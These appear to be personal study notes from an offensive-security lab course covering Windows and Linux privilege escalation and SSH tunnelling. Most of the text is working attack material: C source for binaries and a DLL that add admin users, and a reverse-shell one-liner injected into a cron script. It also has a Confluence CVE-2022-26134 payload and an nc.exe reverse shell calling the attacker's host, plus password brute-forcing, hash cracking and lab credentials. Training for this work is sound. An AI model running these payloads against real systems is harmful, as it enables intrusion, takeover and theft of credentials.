    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
    
    DisplayName   
    ```
  - Running processes on CLIENTWK220 >  bind shell with ID 2064 ,  PowerShell session with ID 9756, mysql, httpd
    `PS C:\Users\dave> Get-Process`
  - summary
    ```
    64-bit Windows 11 Pro Build 22621
    web server on ports 80 and 443
    MySQL server on port 3306
    bind shell on port 4444
    RDP connection on port 3389 from 192.168.48.3
    KeePass Password Manager, 7Zip, and XAMPP are installed
    ```
- Hidden in Plain View
  - Searching for password manager databases on the C:\ drive  
    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`  
  - Searching for sensitive information in XAMPP directory > passwords.txt, my.ini  
    `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`  
  - review the files  
    `type C:\xampp\passwords.txt` `type C:\xampp\mysql\bin\my.ini`  
  - Searching for text files and password manager databases in the home directory of dave > asdf.txt > password: securityIsNotAnOption++++++  
    `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`  
  - check local group user 'dave' > Remote Desktop Users, helpdesk, Remote Management Use  
    `net user steve`  
  - connect to CLIENTWK220 with RDP as steve `xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`  
  - `type C:\xampp\mysql\bin\my.ini` > contents of the my.ini file > MySQL password: admin123admin123!  
  - check local group user 'backupadmin' > not a member of 'remote desktop users' or 'remote management users'  
    `net user backupadmin`  
  - Using Runas to execute cmd as user backupadmin  
    `runas /user:backupadmin cmd`  
- Information goldmine PowerShell
  ```
  Get-History
  Clear-History 
  ```
  - Display path of the history file from PSReadline
    `(Get-PSReadlineOption).HistorySavePath`
    `type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
    ```
    Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
    Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
    Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
    Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
    ```
  - PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users
  - type C:\Users\Public\Transcripts\transcript01.txt
    ```
    Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
    PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
    PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
    PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
    PS C:\Users\dave> Stop-Transcript
    ```
  - Using the commands from the transcript file to obtain a PowerShell session as daveadmin. Start a PowerShell remoting session via WinRM on CLIENTWK220 as the user daveadmi (No output dir)
  - Use evil-winrm to connect to CLIENTWK220 as daveadmin instead  
    `evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
- Automated Enumeration
  - Copy WinPEAS to our home directory and start Python3 web server  
    `cp /usr/share/peass/winpeas/winPEASx64.exe .`  `python3 -m http.server 80`  
  - Connect to the bind shell and transfer the WinPEAS binary to CLIENTWK220  
    `nc 192.168.50.220 4444`   
    `powershell`  
    `iwr -uri http://<KALI>/winPEASx64.exe -Outfile winPEAS.exe`   
  -  Run winPEAS `.\winPEAS.exe`  
  -  Review output: system info (Windows), NTLM settings, transcripts history, Users, possible password
- Service Binary Hijacking (RDP)
  - List of services with binary path > Apache, mysql  
    `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
  - Permissions of httpd.exe > Full, Modify, RX, R, W  
    `icacls "C:\xampp\apache\bin\httpd.exe"` //BULLTIN\Users:(RX)  
    `icacls "C:\xampp\mysql\bin\mysqld.exe"` //BULLTIN\Users:(F)  
  - create a binary file adduser.c to replace the original mysqld.exe
    ```
    #include <stdlib.h>

    int main ()
    {
      int i;
  
      i = system ("net user dave2 password123! /add");
      i = system ("net localgroup administrators dave2 /add");
  
     return 0;
    }
    ```
  - cross-compile the code to 64-bit app
    `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
  - transfer the exe to target and replace mysqld.exe
    ```
    iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
    move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
    move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
    ```
  - restart the service to execute the binary > access denied  
    `net stop mysql`
  - another approach, check the startup type > Auto  
    `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`
  - check the privilege "SeShutDownPrivilege" for reboot privilege  
    `whoami /priv`
  - reboot machine  
    `shutdown /r /t 0`
  - connect again as dave via RDP and open a PowerShell window. new user 'dave2' created.  
    `Get-LocalGroupMember administrators`  
  - Copy PowerUp.ps1 to kali's home directory and serve it with a Python3 web server  
    `cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`  
    `python3 -m http.server 80`  
  - On target machine, download the PowerUp.ps1 and displays services the current user can modify > identified mysql (among others) to be vulnerable  
    ```
    iwr -uri http://<KALI>/PowerUp.ps1 -Outfile PowerUp.ps1 //PowerShell post-exploitation tool used primarily for Windows privilege escalation
    powershell -ep bypass
    . .\PowerUp.ps1
    Get-ModifiableServiceFile
    ```
  - Error of "AbuseFunction" to replace binary file  
    `Install-ServiceBinary -Name 'mysql'` //mysql' for service mysql not modifiable by the current user
  - Listing 55 - Analyzing the function ModifiablePath      
- DLL hijacking
  - placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started  
  - Displaying information about the running service >FileZilla (research shows that this app contain a DLL hijacking vulnerability)  
    `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`  
  - Check if we have permission to write FileZilla  
    `echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`  
    `type 'C:\FileZilla\FileZilla FTP Client\test.txt'`  
  - Goal: identify all DLLs loaded by FileZilla and missing ones. Need administrative privileges to start Process Monitor to collect this data.  
  - starting Process Monitor as backupadmin > browse C:\tools\Procmon\Procmon64.exe (password:admin123admin123! for backupadmin)  
  - Filter by process filezilla.exe  
  - clearing all events  
  - Fiilter path contains TextShaping.dll (This DDL used to hijack FileZilla)  
  - create TextShaping.cpp and compile as TextShaping.dll (malicioous code to create user 'dave3' password 'password123!)  
    ```
    	#include <stdlib.h>
	#include <windows.h>
	
	BOOL APIENTRY DllMain(
	HANDLE hModule,// Handle to DLL module
	DWORD ul_reason_for_call,// Reason for calling function
	LPVOID lpReserved ) // Reserved
	{
	    switch ( ul_reason_for_call )
	    {
	        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
	        int i;
	  	    i = system ("net user dave3 password123! /add");
	  	    i = system ("net localgroup administrators dave3 /add");
	        break;
	        case DLL_THREAD_ATTACH: // A process is creating a new thread.
	        break;
	        case DLL_THREAD_DETACH: // A thread exits normally.
	        break;
	        case DLL_PROCESS_DETACH: // A process unloads the DLL.
	        break;
	    }
	    return TRUE;
	}
    ```
    `x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`  
  - on target, download compiled DLL  
    `iwr -uri http://<KALI>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'`  
  - wait a higher privilege user to run the application and trigger the loading of our malicious DLL  
  - check new user created  
    `net user` `net localgroup administrators`  
- Unquoted Service Paths
  - List of services with binary path > stopped service named "GammaService"  
    `Get-CimInstance -ClassName win32_service | Select Name,State,PathName`
  - OR List of services with spaces and missing quotes in the binary path  
    `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
    ```
    C:\Program.exe
    C:\Program Files\Enterprise.exe
    C:\Program Files\Enterprise Apps\Current.exe
    C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
    ```
  - check if user has permission to restart service  
    `Start-Service GammaService` `Stop-Service GammaService`
  - Review permission on C:\ and C:\Program Files  
    `icacls "C:\"` `icacls "C:\Program Files"` `icacls "C:\Program Files\Enterprise Apps"`
  - place a malicious file named Current.exe in C:\Program Files\Enterprise Apps\  
    ```
    iwr -uri http://<KALI>/adduser.exe -Outfile Current.exe
    copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
    ```
  - start "GammaService"  
    `Start-Service GammaService` `net user` `net localgroup administrators`
  - Use PowerUp "Get-UnquotedService" to identifies this vulnerability  
    ```
    iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
    powershell -ep bypass
    . .\PowerUp.ps1
    Get-UnquotedService
    ```
  - Use the AbuseFunction "Write-ServiceBinary" to exploit the unquoted service path of GammaService
    ```
    Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
    Restart-Service GammaService
    net user
    net localgroup administrators
    ```
- Scheduled Tasks  
  - if tasks run as NT AUTHORITY\SYSTEM or as an administrative user, could lead to privilege escalation  
  - diplay all scheduled tasks > \Microsoft\CacheCleanup  
    start In: C:\Users\steve\Pictures. task to run: C:\Users\steve\Pictures\BackendCacheCleanup.exe  
    `schtasks /query /fo LIST /v`
  - check permission for BackendCacheCleanup.exe > Full access  
    `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`
  - Use our binary adduser.exe to replace the executable file  
    ```
    iwr -Uri http://<KALI>/adduser.exe -Outfile BackendCacheCleanup.exe
    move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
    move .\BackendCacheCleanup.exe .\Pictures\
    ```
- Using Exploits  
  - check current privileges  
    `whoami /priv`
  - enumerate windows version and security patches  
    `systeminfo` `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
  - Locate the kernel exploit [CVE-2023-29360](https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release)  
    `cd .\Desktop\` `dir` `CVE-2023-29360.exe`
  - Elevating our privileges to SYSTEM > nt authority\system  
    `whoami` `.\CVE-2023-29360.exe` `whoami`
  - list of abuse privilege: SeImpersonatePrivilege, SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, SeDebug  
  - [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato): use as a user with the privilege SeImpersonatePrivilege to execute commands or obtain an interactive shell as NT AUTHORITY\SYSTEM  
  - Download SigmaPotato.exe and server it with a Python3 web server  
    ```
    nc 192.168.50.220 4444
    whoami /priv

    wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
    python3 -m http.server 80

    #Target machine
    C:\Users\dave> powershell
    iwr -uri http://<KALI>/SigmaPotato.exe -OutFile SigmaPotato.exe
    ```
  - Use SigmaPotato tool to add a new user to the Admin localgroup  
    ```
    .\SigmaPotato "net user dave4 lab /add"
    .\SigmaPotato "net localgroup Administrators dave4 /add"
    ```

### 18. Linux privilege escalation  
Reference  
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  
- enumerating linux
  - current user  
    `id` > uid=1000(joe) gid=1000(joe) groups=1000(joe)
    `cat /etc/passwd` > 
    root:x:0:0:root:/root:/bin/bash
    joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin   
    Login name: joe, Encrypted Password: x, UID user ID, GID group ID, home folder /home/joe,  /usr/sbin/nologin block remote 
  - `hostname`  
  - OS  
    ```
    cat /etc/issue  //Debian GNU/Linux 10 \n \l
    cat /etc/os-release  //PRETTY_NAME="Debian GNU/Linux 10 (buster)"
    uname -a   //kernel version and architect: Linux debian-privesc 4.19.0-21-amd64 
    ```
  - system processes  
    `ps aux`
  - listing TCP/IP configs on all adapters > network  
    `ip a` `routel` `ss -anp`
  - Inspecting custom IP table > -A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT  
    `cat /etc/iptables/rules.v4`
  - List schedule/cron jobs > /etc/cron.daily  
    `ls -lah /etc/cron*`
  - List con job for current user > no cron job  
    `crontab -l` root user: `sudo crontab -l`
  - List all installed packages on Debian Linux >  Apache HTTP Server  
    `dpkg -l`
  - List all writable directories > /home/joe/.scripts  
    `find / -writable -type d 2>/dev/null`
  - List content of /etc/fstab and all mounted drives
    `cat /etc/fstab`  `mount`
  - View drives > sda1,2,3  
    `lsblk`
  - List loaded drivers > lsmod  
    `lsmod`
  - diplay additional info about a module  > filename: /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
    `/sbin/modinfo libata`  
  - 2 special right setuid, setgid
    `find / -perm -u=s -type f 2>/dev/null`
  - Automated enumeration
    `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`: transfer script to target
    `joe@debian-privesc:~$ ./unix-privesc-check standard > output.txt`  
- exposed confidential info
  - inspect env variables > SCRIPT_CREDENTIALS=lab
    `env`
  - inspect .bashrc > export SCRIPT_CREDENTIALS="lab"
    `cat .bashrc`
  - escalate privilege by typing the found password
    `su - root` 'whoami' (use root password)
  - generate a wordlist of bruteforce attack
    `crunch 6 6 -t Lab%%% > wordlist`
  - use hydra to brute force ssh > Lab123 > ssh eve@192.168.50.214
    `hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V`
  - elevate to root 
    `sudo -i` `whoami`	(use user's password)
  - Harvesting Active Processes for Credentials > sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'  
    `watch -n 1 "ps -aux | grep pass"`
  - Use tcpdump to sniff password > user:root,pass:lab  
    `sudo tcpdump -i lo -A | grep "pass"`   
- insecure file permission > /bin/bash /home/joe/.scripts/user_backups.sh  
  - **inspect cron log file  **
    `grep "CRON" /var/log/syslog`  
  - inspect content and permisission of script > every user can write the file -rwxrwxrw-  
    `cat /home/joe/.scripts/user_backups.sh`  
    `ls -lah /home/joe/.scripts/user_backups.sh`  
  - insert one-liner user_backs.sh  
    ```
    cd .scripts
    echo >> user_backups.sh
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f" >> user_backups.sh
    ```
  - get a root shell from target
    `nc -lnvp 1234`
  - **/etc/passwd (account) takes precedence over /etc/shadow (password)**  
  - escalate privilege by editing /etc/passwd  
    ```
    openssl passwd w00t
    echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
    su root2
    Password: w00t
    id
    ```
- abuse system linux components  
  - abuse setuid binaries and capabilities  
    - execute passwd change `passwd`  
    - inspect passwd process `ps u -C passwd`  
    - inspect passwd process pid `grep Uid /proc/1932/status`  
    - reveal SUID flag `ls -asl /usr/bin/passwd` //-rwsr-xr-x 1 root root  
    - set SUID `chmod u+s <file>`  
    - abuse SUID and get a root shell `find /home/joe/Desktop -exec "/usr/bin/bash" -p \;` `whoami`  
    - manual enumerate capabilities (privilege escalation) > /usr/bin/perl = cap_setuid+ep  
      `/usr/sbin/getcap -r / 2>/dev/null`  
    - check [GTFOBins](https://gtfobins.github.io/) for misued > search pearl 
      ```
      //if the binary has CAP_SETUID (Capabilities)
      ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
      ```
  - abuse sudo
    - inspect current user sudo permission > (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
      `sudo -l` 
    - [abuse tcpdump sudo permission](https://gtfobins.github.io/gtfobins/tcpdump/#sudo) > permission denied  
      ```
      COMMAND='id'
      TF=$(mktemp)
      echo "$COMMAND" > $TF
      chmod +x $TF
      sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
      ```
    - inspect syslog file for 'tcpdump' related events > audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump"
      `cat /var/log/syslog | grep tcpdump`
    - verify AppArmor status >  /usr/sbin/tcpdump
      `su - root` `aa-status`
    - ['Apt-get'](https://gtfobins.github.io/gtfobins/apt-get/#sudo) privilege escalation payload
      `sudo apt-get changelog apt`
  - exploit kernel vulnerababilities
    - depend OS Debian, RHEL, Gentoo  
    - gather info of target  
      `cat /etc/issue` > Ubuntu 16.04.4 LTS \n \l
    - gather kernel and architecture  (linux)  
      `uname -r` > 4.4.0-116-generic    
      `arch` > x86_64  
    - Use [searchsploit](https://www.exploit-db.com/searchsploit) to find kernel exploits matching the target version  
      `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"`
      output: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010. (newer and matches our kernel version)  
    - Use gcc to compile (must match the architecture of target)  
      ```
      cp /usr/share/exploitdb/exploits/linux/local/45010.c .
      head 45010.c -n 20

      #output
      gcc cve-2017-16995.c -o cve-2017-16995

      mv 45010.c cve-2017-16995.c
      ```
    - transfer the source code to the target machine  
      `scp cve-2017-16995.c joe@192.168.123.216:`  
    - compiling the exploit on the target  
      `joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995`  
    - examing the exploit binary file's architecture > x86-64  
      `file cve-2017-16995`  
    - obtain a root shell via kernel exploitation  
      `./cve-2017-16995` `id`  

### 19. Port redirection and SSH tunneling
- **Port redirection** modifies the data flow by redirecting packets from one socket to another. Configure a host to listen on one port and relay all packets received on that port to another destination
- **Tunneling** means encapsulating one type of data stream within another, for example, transporting Hypertext Transfer Protocol (HTTP) traffic within a Secure Shell (SSH) connection
- A **DMZ** is a network containing devices that may be more exposed to a wider, less trusted network
- Kali (WAN) > Confluence + PostgreSQL (DMZ)  
- Port forward to access PostgreSQL PGDATABASE01 from kali  
  - confluence 192.168.124.63; PGDATABASE01 10.4.124.215; kali 192.168.45.156  
  - `nc -nvlp 4444`  
  - get reserve shell from confluence [CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/). change confluence server and kali ip.  
    `curl http://192.168.124.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.156/4444%200%3E%261%27%29.start%28%29%22%29%7D/`
  - enumerating network interface on CONFLUENCE01 > 192.168.124.63/24, 10.4.124.63/24  
    `ip addr`  
  - enumerating routes on CONFLUENCE01 > 192.168.124.0/24 dev ens192 , 10.4.124.0/24 dev ens224  
    `ip route`  
  - credentials found in the Confluence confluence.cfg.xml  
    `cat /var/atlassian/application-data/confluence/confluence.cfg.xml`  
    output: <property name="hibernate.connection.password">D@t4basePassw0rd!</property>, <property name="hibernate.connection.url">jdbc:postgresql://10.4.124.215:5432/confluence</property>, <property name="hibernate.connection.username">postgres</property>  
  - open TCP 2345 on CONFLUENCE01 then forward to TCP 5432 on PGDATABASE01. Use Socat to do port forward  
    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.124.215:5432`  
  - use psql to connect to PostgreSQL database through our port forward  
    `psql -h 192.168.124.63 -p 2345 -U postgres`  
  - list out database info >  confluence  
    `postgres=# \l`  
  - connect to 'postgres' db  
    `\c confluence`  
  - View user info ~ [OneCompiler](https://onecompiler.com/mysql) > admin, database_admin, hr_admin, rdp_admin + SHA1/256 credentials  
    `select * from cwd_user;`  
    output: {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA  
  - identify hashcat mode number from [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes): 12001  
    `hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt`  
  - create a new port forward 2222  
    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.124.215:22`  
  - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01  
    `ssh database_admin@192.168.124.63 -p2222`  
- SSH Tunneling (**local** port forward)
  - HRSHARES 172.16.114.217; PGDATABASE01 10.4.114.215; CONFLUENCE01 192.168.114.63  
  - manually mount folder in kali (share files from local to kali vm)  
    ```
    sudo mkdir -p /mnt/hgfs
    sudo vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
    ```
  - tunneling: encapsulating one kind of data stream within another as it travels across a network. E.g ssh, rlogin/telnet (unencrypted).  
  - SSH port forwarding: tunneling data through an SSH connection.  
  - WAN (Kali) > DMS (CONFLUENCE01 - ssh client > PGDATABASE01 - ssh server > SMB)  
  - reverse shell TTY to PGDATABASE01 and login as database_admin  
    `confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'`  
    `ssh database_admin@10.4.114.215` pass: sqlpass123  
  - enumerate network interfaces on PGDATABASE01 > 10.4.114.215/24, 172.16.114.254/24  
    `ip addr`
  - enumerate network routes/subnets on PGDATABASE01 > 10.4.114.0/24 dev ens192, 172.16.114.0/24 dev ens224  
    `ip route`
  - scan port 445 (SMB) on IPs from 172.16.50.1 to 172.16.50.254 > 172.16.114.217 SMB  
    `for i in $(seq 1 254); do nc -zv -w 1 172.16.114.$i 445; done`
  - local port forward from CONFLUENCE01 (0.0.0.0:4455) to SSH tunnel 172.16.114.217:445  
    `confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.114.217:445 database_admin@10.4.114.215`
  - Port 4455 listening on all interfaces on  CONFLUENCE01  
    `ss -ntplu`
  - Listing SMB shares through the SSH local port forward running on CONFLUENCE01. > scripts  
    `kali@kali:~$ smbclient -p 4455 -L //192.168.114.63/ -U hr_admin --password=Welcome1234`
  - Listing files in the scripts share, using smbclient over our SSH local port forward running on CONFLUENCE01  
    `smbclient -p 4455 //192.168.114.63/scripts -U hr_admin --password=Welcome1234` `smb: \> ls` `smb: \> get Provisioning.ps1`
- SSH Tunneling (**dynamic** port forward)  
  - WAN (Kali) > DMZ (Confluence) > Internal (DB >>> HR)  
  - KALI 192.168.45.250, CONFLUENCE01 192.168.114.63, DB 10.4.114.215, HR 172.16.114.217  
  - open SSH dynamic port forward on port 9999  
    ```
    confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
    ssh -N -D 0.0.0.0:9999 database_admin@10.4.114.215
    ```
  - edit the proxychain confi file > use smbclient from our Kali machine to enumerate available shares on HRSHARES  
    `socks5 192.168.114.63 9999`
  - smbclient connect to HRSHARES through the SOCKS proxy using Proxychains > scripts  
    `proxychains smbclient -L //172.16.114.217/ -U hr_admin --password=Welcome1234`
  - scan top 20 TCP ports on 172.16.50.217 > 135, 139, 445, 3389  
    `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.114.217`
- SSH Tunneling (**remote** port forward)
  - WAN (Kali)<FW only port 8090 inbound and all outbound > DMZ (Confluence) > Internal (DB >>> HR)
  - start ssh server on kali
    `sudo systemctl start ssh`
  - check SSH server on kali is listening
    `sudo ss -ntplu`
  - reverse shell to confluence + TTY shell
  - to connect back kali, need to explicity allow password-based authentication  
    `PasswordAuthentication to yes in /etc/ssh/sshd_config`   
  - listen on port 2345 on kali and forward traffic to DB port 5432  
    `ssh -N -R 127.0.0.1:2345:10.4.114.215:5432 kali@192.168.45.250`
  - checking if port 2345 is bound on the kali ssh server >  127.0.0.1:2345  
    `ss -ntplu`
  - Listing databases on the PGDATABASE01, using psql through the SSH remote port forward  
    `kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres` `postgres=# \l`
  - Connect to 'DB hr_backup'  
    `\c hr_backup`
  - List out all tables  
    `\dt`
  - query data  
    'SELECT * FROM payroll;'
- SSH Tunneling (**remote dynamic** port forward)
  - Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain all the flexibility of traditional dynamic port forwarding. We can connect to any port on any host that CONFLUENCE01 has access to by passing SOCKS-formatted packets.
  - we pass only one socket: the socket we want to listen on the SSH server
  - Kali: 192.168.45.233, DB:10.4.133.215, MULTISERVER03: 192.168.133.64
  - SSH with the remote dynamic port forward  
    ```
    confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
    ssh -N -R 9998 kali@192.168.45.233
    ```
  - Edit proxychains config to point to new SOCKS proxy on port 9998  
    `nano /etc/proxychains4.conf` `socks5 127.0.0.1 9998`
  - Scanning MULTISERVER03 through the remote dynamic SOCKS port with Proxychains > 80, 135, 3389  
    `proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.133.64` (change to internal server 10.4.xxx.64)
- **sshuttle**
  - sshuttle is a tool that turns an SSH connection into something like a VPN by setting up local routes that force. Requires root privileges on the SSH client and Python3 on the SSH server  
  - Forwarding port 2222 on CONFLUENCE01 to port 22 on PGDATABASE01  
    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`
  - Running sshuttle from our Kali machine, pointing to the forward port on CONFLUENCE01  
    `kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24`
  - Connecting to the SMB share on HRSHARES, without any explicit forwarding > scripts  
    `kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`  
- Port Forwarding with windows tool **ssh.exe**  
  - Starting SSH server on the Kali machine.  
    `kali@kali:~$ sudo systemctl start ssh`
  - Connecting to the RDP server on **MULTISERVER03** using xfreerdp  
    `kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`
  - Finding ssh.exe on MULTISERVER03 > C:\Windows\System32\OpenSSH\ssh.exe  
    `C:\Users\rdp_admin>where ssh` `ssh.exe -V` (higher than 7.6 can use for remote dynamic port forward)  
  - Connecting back to our Kali machine to open the remote dynamic port forward  
    `C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4`  
  - update /etc/proxychains4.conf to use this socket  
    `socks5 127.0.0.1 9998`  
  - Connecting to the PostgreSQL server with psql and Proxychains  
    `kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres`  `postgres=# \l`  
- Port Forwarding with windows tool **Plink**
  - MULTISERVER03 is already “pre-compromised”. Browse /umbraco/forms.aspx on MULTISERVER03 to run arbitrary commands
  - Starting Apache2  `kali@kali:~$ sudo systemctl start apache2`
  - Copying nc.exe to the Apache2 webroot  
    `find / -name nc.exe 2>/dev/null` `sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/`  
  - payload is downloaded from our Apache2 server to C:\Windows\Temp\nc.exe on MULTISERVER03.  
    `powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe`
  - The Netcat listener on our Kali machine `kali@kali:~$ nc -nvlp 4446`
  - The nc.exe reverse shell payload we execute in the web shell  > c:\windows\system32\inetsrv>  
    `C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446`
  - Copying plink.exe to our Apache2 webroot  
    `kali@kali:~$ find / -name plink.exe 2>/dev/null` `kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/`  
  - Plink downloaded to the C:folder  
    `c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe`
  - using Plink (PuTTY Link) to create an SSH reverse tunnel from a victim windows machine back to your attacker-controlled SSH server at 192.168.118.4 (reverse tunnel: binds 127.0.0.1:9833 on SSH server, forwards 3389 on victim)  
    `c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4`
  - OR automatically confirm a host key confirmation:  
    `cmd.exe /c echo y | ..exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7`
  - Connecting to the RDP server with xfreerdp, through the Plink port forward  
    `kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833`
- Port Forwarding with windows tool **Netsh** (needs admin)  
  - built-in firewall configuration tool Netsh (also known as Network Shell).  
  - CONFLUENCE01 is no longer accessible. MULTISERVER03 is serving its web application on TCP port 80  
  - RDP directly into MULTISERVER03 from  Kali  
    `kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`
  - instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215). > no output receive but port open  
    `C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`
  - netstat showing that TCP/2222 is listening on the external interface. > 192.168.50.64:2222  
    `C:\Windows\system32>netstat -anp TCP | find "2222"`
  - Listing all the portproxy port forwarders set up with Netsh  
    `C:\Windows\system32>netsh interface portproxy show all`
  - We can’t connect to port 2222 from （FW block) > filtered  
